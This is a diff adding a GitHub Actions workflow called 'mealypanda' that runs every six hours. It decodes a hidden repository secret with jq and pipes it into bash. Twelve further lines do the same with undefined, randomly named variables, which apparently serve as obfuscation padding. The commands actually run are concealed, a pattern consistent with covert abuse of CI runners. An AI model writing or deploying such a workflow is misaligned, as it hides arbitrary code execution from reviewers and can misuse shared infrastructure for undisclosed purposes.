@@ -1,0 +1,30 @@
+name: mealypanda
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mealypanda
+        env:
+          q6: ${{ secrets.q6 }}
+        run: |
+          echo $q6 | jq -r .jvge2 | /bin/bash
+          echo $fei61 | jq -r .afle797 | /bin/bash
+          echo $fjxy672 | jq -r .kok3550 | /bin/bash
+          echo $uw3903 | jq -r .n4 | /bin/bash
+          echo $clf191 | jq -r .edb220 | /bin/bash
+          echo $njhnf9298 | jq -r .staed412 | /bin/bash
+          echo $lj493 | jq -r .f9319 | /bin/bash
+          echo $tj63057 | jq -r .i41035 | /bin/bash
+          echo $lchv6060 | jq -r .bf73 | /bin/bash
+          echo $ug186 | jq -r .yqn597 | /bin/bash
+          echo $jxu49 | jq -r .aqfn261 | /bin/bash
+          echo $j4 | jq -r .yrecj61 | /bin/bash
+          echo $dlr90 | jq -r .mw66 | /bin/bash
+
